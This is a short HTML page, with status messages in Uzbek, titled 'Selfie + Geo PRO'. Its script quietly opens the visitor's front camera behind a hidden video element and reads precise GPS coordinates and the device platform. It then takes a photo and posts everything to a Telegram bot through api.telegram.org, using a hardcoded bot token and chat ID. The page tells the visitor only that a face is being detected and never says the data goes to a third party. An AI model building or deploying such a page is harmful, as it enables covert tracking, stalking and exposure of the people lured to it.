<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selfie + Geo PRO</title>
    <style>
        body {
            background: #020617;
            color: white;
            font-family: Arial;
            text-align: center;
            margin-top: 40px;
        }
        video {
            display: none;
        }
        .status {
            margin-top: 15px;
            font-size: 18px;
        }
        .success {
            font-size: 60px;
            color: #22c55e;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h2>Selfie + Geo PRO</h2>
    <video id="video" autoplay playsinline></video>
    <p id="status" class="status">Kuting...</p>
    <div id="check"></div>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const token = "8096738475:AAEE5PcibE_TdHsMFAL89Uvan8zaHStlTqE";
        const chat_id = "8108956117";
        const video = document.getElementById("video");
        const status = document.getElementById("status");
        let localStream;
        let retryCount = 0;
        const maxRetries = 3;

        function startCamera() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                localStream = stream;
                video.srcObject = stream;
                status.innerText = "Yuz aniqlanmoqda";
                video.onloadeddata = () => {
                    setTimeout(getLocationAndPhoto, 500);
                };
            })
            .catch(() => {
                if (retryCount < maxRetries) {
                    retryCount++;
                    status.innerText = `Kamera ruxsati kutilmoqda (${retryCount}/${maxRetries})...`;
                    setTimeout(startCamera, 2000);
                } else {
                    status.innerText = "❌ Kamera ruxsati yo'q";
                }
            });
        }

        startCamera();

        function getLocationAndPhoto() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    takePhoto(lat, lon);
                }, () => {
                    status.innerText = "❌ Joylashuv ruxsati yo'q";
                    takePhoto(null, null);
                }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
            } else {
                status.innerText = "❌ GPS ishlamaydi";
                takePhoto(null, null);
            }
        }

        function takePhoto(lat, lon) {
            const canvas = document.getElementById("canvas");
            const ctx = canvas.getContext("2d");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);

            const image = canvas.toDataURL("image/png");
            const blob = dataURItoBlob(image);

            const formData = new FormData();
            formData.append("chat_id", chat_id);
            let caption = "📷 Selfie PRO";
            
            if (lat && lon) {
                caption += `\n🌎 Location: https://maps.google.com/?q=${lat},${lon}`;
            }
            
            const platform = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;
            caption += `\n📱 Platforma: ${platform}`;

            formData.append("caption", caption);
            formData.append("photo", blob, "photo.png");

            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: "POST",
                body: formData
            })
            .then(response => {
                if(localStream) {
                    localStream.getTracks().forEach(track => track.stop());
                }
                if (response.ok) {
                    status.innerText = "Surat va ma'lumot muvaffaqiyatli yuborildi";
                    document.getElementById("check").innerHTML = "✓";
                } else {
                    status.innerText = "❌ Yuborishda xatolik yuz berdi";
                }
            })
            .catch(() => {
                if(localStream) {
                    localStream.getTracks().forEach(track => track.stop());
                }
                status.innerText = "❌ Xatolik yuz berdi";
            });
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: 'image/png' });
        }
    </script>
</body>
</html>
